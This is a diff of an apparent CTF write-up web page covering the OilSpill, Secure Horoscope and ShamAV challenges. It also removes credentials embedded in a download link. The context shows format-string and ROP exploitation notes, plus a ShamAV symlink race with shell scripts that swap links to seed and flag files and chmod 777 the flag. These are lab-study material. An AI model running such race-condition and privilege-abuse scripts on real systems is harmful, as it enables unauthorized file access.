@@ -81,7 +81,7 @@
               ><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
               <a
                 class="menu-link"
-                href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                href="https://download.roderickchan.cn/"
                 title="My resources download center"
                 rel="noopener noreferrer" target="_blank"
               ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> Download</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
@@ -168,7 +168,7 @@
               class="menu-item"
             ><a
                   class="menu-link"
-                  href="https://roderick:rode%40rick@download.roderickchan.cn/"
+                  href="https://download.roderickchan.cn/"
                   title="My resources download center"
                   rel="noopener noreferrer" target="_blank"
                 ><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> Download</a></li><li
@@ -280,19 +280,18 @@
 <p>It&rsquo;s an easy task about <code>fmt-attack</code>. However, I had a problem when I used my <code>exp.py</code> to attack remote host. The problem is that I cannot get any output from the remote host. After I input something, I get the address of <code>puts/printf/temp</code> and then, the program in remote host is stopped. That means I cannot get glibc address before I input&hellip;&hellip;.Maybe it&rsquo;s caused by my proxy VPN app.</p>
 <p>In order to solve the problem, I decide to find a way to execute the <code>main</code> function again. The <code>.fini_array</code> section is chosen and I plan to replace <code>.fini_array[0]</code> with <code>main</code> address. Unfortunately, the address of <code>.fini_array</code> is <code>0x600A40</code>, which contains <code>\x0a</code>. WTF!!!!</p>
 <p>Then, I try to use <code>partial overwritting</code> to do <code>rop</code>， and I found that there&rsquo;s a gadget  <code>add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</code> nearby puts@glibc.</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-1"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0000000000080344: add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
-</span></span><span class="line"><span class="cl">000000000000080970   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">000000000000080970   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5</span></span></code></pre></td></tr></table>
 </div>
 </div><p>To guess half a byte of the gadget, and use <code>fmt-attack</code> to modify the lowest <code>2</code> bytes of <code>puts@got</code>. then make use of <code>magic gadget</code> to change <code>printf@got</code> to <code>one gadget</code> and call printf to get shell.</p>
 <h3 id="exp">EXP</h3>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-2"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -407,8 +406,7 @@
 </span></span><span class="line"><span class="cl">    <span class="n">sl</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="n">ia</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>use command :  <code>for i in $(seq 1  8); do ./exp.py re ./OilSpill oil.sdc.tf:1337 -nl; done</code> to enumerate and get shell.</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508213922905.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508213922905.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508213922905.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508213922905.png 2x" sizes="auto" data-title="image-20220508213922905" data-alt="image-20220508213922905" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -420,7 +418,7 @@
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215628900.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215628900.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215628900.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215628900.png 2x" sizes="auto" data-title="image-20220508215628900" data-alt="image-20220508215628900" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215638710.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215638710.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215638710.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215638710.png 2x" sizes="auto" data-title="image-20220508215638710" data-alt="image-20220508215638710" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h3 id="exp-1">EXP</h3>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-3"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -473,8 +471,7 @@
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>attack remote host:</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215730626.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215730626.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215730626.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508215730626.png 2x" sizes="auto" data-title="image-20220508215730626" data-alt="image-20220508215730626" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
@@ -506,7 +503,7 @@
 </li>
 </ul>
 <h3 id="exp-2">EXP</h3>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-4"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -597,8 +594,7 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508220506836.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508220506836.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508220506836.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508220506836.png 2x" sizes="auto" data-title="image-20220508220506836" data-alt="image-20220508220506836" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="secure-horoscope">Secure Horoscope</h2>
@@ -617,7 +613,7 @@
 <li>rop and use magic gadget to get shell</li>
 </ul>
 <h3 id="exp-3">EXP</h3>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-5"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -688,8 +684,7 @@
 </span></span><span class="line"><span class="cl">    <span class="p">]</span>
 </span></span><span class="line"><span class="cl"><span class="p">},</span> <span class="n">length</span><span class="o">=</span><span class="mh">0x8c</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508221234264.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508221234264.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508221234264.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508221234264.png 2x" sizes="auto" data-title="image-20220508221234264" data-alt="image-20220508221234264" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <h2 id="shamav">ShamAV</h2>
@@ -697,7 +692,7 @@
 <p>Tips: <code>shutil.copyfile(src, dst)</code> will raise an exception if <code>src</code> is  not readable; If <code>dst</code> already exists, it will be replaced.</p>
 <h3 id="analysis-of-server">analysis of server</h3>
 <p>Download the <code>server.py</code>:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-6"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -882,11 +877,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">try</span><span class="o">:</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">conn</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">except</span><span class="w"> </span><span class="n">OSError</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">e</span><span class="o">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">E</span><span class="p">]</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">sendall</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">e</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">log</span><span class="p">(</span><span class="n">f</span><span class="err">&#39;</span><span class="p">[</span><span class="n">E</span><span class="p">]</span><span class="w"> </span><span class="n">OS</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">sendall</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="n">e</span><span class="p">}</span><span class="err">&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>and the <code>launch.sh</code>:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-7"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -943,11 +937,10 @@
 </span></span><span class="line"><span class="cl">    <span class="k">done</span>
 </span></span><span class="line"><span class="cl"><span class="o">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">main &gt; av.log
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">main &gt; av.log</span></span></code></pre></td></tr></table>
 </div>
 </div><p>The vuln is in <code>_scan</code> method:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-8"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -972,8 +965,7 @@
 </span></span><span class="line"><span class="cl">    <span class="n">target_path</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;/home/antivirus/quarantine/sham-av-</span><span class="si">{</span><span class="n">genrandom</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span>
 </span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;[D] Copying file from </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1"> to </span><span class="si">{</span><span class="n">target_path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">shutil</span><span class="o">.</span><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">target_path</span><span class="p">)</span> <span class="c1"># used</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">        <span class="n">shutil</span><span class="o">.</span><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">target_path</span><span class="p">)</span> <span class="c1"># used</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>We can create a file which belongs to <code>ctf</code> to bypass the check of <code>USER_UID</code>, then remove the file and create a symbol link to <code>/home/antivirus/seed</code> with the same name instantly. In a lucky moment, the <code>/home/antivirus/seed</code>file is copied to <code>/home/antivirus/quarantine</code>, so we can read the content of <code>seed</code> and get its data.</p>
 <p>Once we get <code>seed</code>, we can generate and forecast all the next <code>sha-256</code> digest values using <code>genrandom</code> method in <code>server.py</code>.</p>
@@ -988,7 +980,7 @@
 </li>
 <li>
 <p>create a file <code>/home/ctf/server.py</code>, with content:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-9"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -997,8 +989,7 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
-</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;chmod 777 /home/antivirus/flag.txt&#39;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;chmod 777 /home/antivirus/flag.txt&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 <li>
@@ -1016,28 +1007,26 @@
 </ul>
 <h3 id="exp-4">EXP</h3>
 <p>First, use following command to create three bash scripts:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-10"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/seed /home/ctf/flag;sleep 0.1; done&#39;</span> &gt; exp1.sh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/flag.txt /home/ctf/flag; done&#39;</span> &gt; exp2.sh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do /home/ctf/bin/scan /home/ctf/flag; done&#39;</span> &gt; attack.sh <span class="o">&amp;&amp;</span> chmod +x *.sh
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/seed /home/ctf/flag;sleep 0.1; done&#39;</span> &gt; exp1.sh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do rm -rf /home/ctf/flag;touch /home/ctf/flag;rm -rf /home/ctf/flag;ln -s /home/antivirus/flag.txt /home/ctf/flag; done&#39;</span> &gt; exp2.sh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\nwhile true; do /home/ctf/bin/scan /home/ctf/flag; done&#39;</span> &gt; attack.sh <span class="o">&amp;&amp;</span> chmod +x *.sh</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Then, execute:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-11"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">timeout <span class="m">60</span> ./exp1.sh <span class="p">&amp;</span>
-</span></span><span class="line"><span class="cl">timeout <span class="m">60</span> ./attack.sh
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">timeout <span class="m">60</span> ./attack.sh</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Now, the seed file has been copied to <code>/home/antivirus/quarantine</code>, create a symbol link <code>/home/ctf/seed</code> to point to the seed file in <code>/home/antivirus/quarantine</code></p>
 <p>Use <code>base64</code> to write <code>go.py</code>：</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-12"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1116,11 +1105,10 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="c1"># check</span>
 </span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls -al /home/antivirus/quarantine&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls -al /home/antivirus/server.py&#34;</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;ls -al /home/antivirus/server.py&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>And, execute command:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-13"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1167,19 +1155,17 @@
 </span></span></span><span class="line"><span class="cl"><span class="s">EOF</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">base64 -d tmp &gt; go.py
-</span></span><span class="line"><span class="cl">python3 go.py
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">python3 go.py</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Finally:</p>
-<div class="highlight"><div class="chroma">
+<div class="highlight" id="id-14"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./exp2.sh <span class="p">&amp;</span>
-</span></span><span class="line"><span class="cl">timeout <span class="m">60</span> ./attack.sh
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">timeout <span class="m">60</span> ./attack.sh</span></span></code></pre></td></tr></table>
 </div>
 </div><p>If you&rsquo;re a lucky boy, you will find the <code>/home/antivirus/flag.txt</code> is <code>rwxrwxrwx</code>, now, capture the flag:</p>
 <p><img loading="lazy" src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508223638363.png" srcset="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508223638363.png, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508223638363.png 1.5x, https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220508223638363.png 2x" sizes="auto" data-title="image-20220508223638363" data-alt="image-20220508223638363" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
